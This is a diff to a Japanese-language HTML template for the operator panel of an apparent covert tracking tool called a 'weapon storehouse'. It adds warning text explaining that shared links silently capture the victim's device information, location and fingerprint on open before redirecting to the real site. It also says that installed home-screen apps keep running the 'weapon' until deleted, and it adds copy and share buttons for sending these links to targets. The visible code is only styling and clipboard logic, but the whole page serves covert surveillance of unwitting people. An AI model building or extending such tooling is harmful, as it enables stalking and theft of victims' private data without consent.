@@ -24,6 +24,11 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
   color:#c7cddb;text-decoration:none;font-size:13px}
 .tabs a.on{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
 .desc{font-size:12px;color:#8b93a7;margin-top:2px;line-height:1.7}
+.caution{background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:8px;
+  padding:8px 10px;font-size:12px;line-height:1.7;margin-top:8px}
+.caution.big{margin:10px 0}
+.auto{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
+  background:#16321f;border:1px solid #2e6b45;color:#7ee08a}
 </style></head><body>
 
 <div class="tabs">
@@ -33,9 +38,17 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
   <a href="{{ base }}/tracking">切替</a>
 </div>
 
-<h1>兵器庫</h1>
+<h1>兵器庫（ウイルス兵器保管庫）</h1>
 <p class="dim">相手に踏ませるURLは <span class="mono">{{ base }}/v/コード</span> です。ログイン不要。
-  自分は <span class="mono">{{ base }}/vp/コード</span> で結果を見ます。</p>
+  自分は <span class="mono">{{ base }}/vp/コード</span> で結果を見ます。
+  インストール型は <b>追加した瞬間から自動で兵器が動きます</b>。</p>
+
+<div class="caution big">
+  ⚠ <b>注意書き</b><br>
+  ・リンク型：開いた瞬間から自動で始まります。開いただけで端末情報・位置・指紋を抜き取り、そのまま本物のサイトへ飛びます（＝自爆）。<br>
+  ・インストール型：ホーム画面に追加すると自爆します。以後その端末では自動で兵器が起動し続け、本人がアプリを消すまで止まりません。<br>
+  ・<b>インストールしなくても渡せます</b>。下のURLをコピー／共有するだけで相手に送れます。
+</div>
 
 <h3>新規作成</h3>
 <form method="post" action="/vp/add" class="card">
@@ -57,13 +70,17 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
     <div class="row">
       <b>{{ r.name }}</b> <span class="mono">{{ r.code }}</span>
       <span class="dim">{{ r.mode_label }}</span>
+      {% if r.auto %}<span class="auto">インストールで自動発射</span>{% endif %}
       <span class="dim">{{ r.hits or 0 }}回</span>
       {% if not r.active %}<span class="dim">停止中</span>{% endif %}
     </div>
     <div class="row">
       <input class="url" readonly value="{{ r.share }}" onclick="this.select()">
-      <button class="mini cp" type="button" data-url="{{ r.share }}">送るURLをコピー</button>
+      <button class="mini cp" type="button" data-url="{{ r.share }}">URLをコピー</button>
+      <button class="mini sh" type="button" data-url="{{ r.share }}"
+              data-title="{{ r.name }}">共有</button>
     </div>
+    {% if r.caution %}<div class="caution">{{ r.caution }}</div>{% endif %}
     <div class="row">
       <a class="btn" href="{{ r.watch }}">結果</a>
       <a class="btn" href="{{ r.share }}" target="_blank">開く</a>
@@ -78,11 +95,10 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
 {% endif %}
 
 <script>
-document.querySelectorAll('.cp').forEach(function (b) {
-  b.addEventListener('click', function () {
-    var u = b.getAttribute('data-url') || '';
+(function () {
+  function copyText(u, b, orig) {
     function done() { b.textContent = 'コピーしました';
-      setTimeout(function () { b.textContent = '送るURLをコピー'; }, 1500); }
+      setTimeout(function () { b.textContent = orig; }, 1500); }
     function fb() {
       try { var t = document.createElement('textarea'); t.value = u;
             t.style.cssText = 'position:fixed;left:-9999px'; document.body.appendChild(t);
@@ -90,7 +106,19 @@ document.querySelectorAll('.cp').forEach(function (b) {
     }
     try { navigator.clipboard && navigator.clipboard.writeText
             ? navigator.clipboard.writeText(u).then(done).catch(fb) : fb(); } catch (e) { fb(); }
+  }
+  document.querySelectorAll('.cp').forEach(function (b) {
+    b.addEventListener('click', function () {
+      copyText(b.getAttribute('data-url') || '', b, b.textContent);
+    });
   });
-});
+  document.querySelectorAll('.sh').forEach(function (b) {
+    b.addEventListener('click', function () {
+      var u = b.getAttribute('data-url') || '', t = b.getAttribute('data-title') || '';
+      if (navigator.share) navigator.share({ title: t, text: t, url: u }).catch(function () {});
+      else copyText(u, b, b.textContent);
+    });
+  });
+})();
 </script>
 </body></html>
